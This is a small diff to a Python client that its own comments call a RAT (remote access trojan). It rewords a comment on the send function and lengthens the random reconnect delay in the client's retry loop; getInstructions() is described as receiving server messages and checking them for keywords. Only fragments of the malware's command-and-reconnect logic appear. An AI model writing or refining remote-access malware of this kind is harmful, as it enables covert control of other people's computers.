@@ -16,7 +16,7 @@ port = 80  # This is the Connection Port
 
 def send(msg):
     s.send(msg.encode("UTF-8"))
-    # This sends an our message which is encoded in UTF-8 encryption
+    # This sends our message which is being encoded in UTF-8 (Unicode Standard)
     
 #getInstructions() is the Heart of our Client. This Function receives the messages from the Server and then check them for keywords like 'test'. 
 # Test is the first added "feature" of this RAT. 
@@ -73,8 +73,8 @@ while connected == False:
         # the connection is now true
     except: 
       # If it doesn't connect
-        sleepTime = random.randint(20, 30)
+        sleepTime = random.randint(40, 60) # The ideal time would be from 40 - 60 seconds due to network capabilities.
         time.sleep(sleepTime)
-        # Wait from a time of around 20-30 seconds and then connect again
+        # Wait from a time of around 40-60 seconds and then connect again
  
 getInstructions()
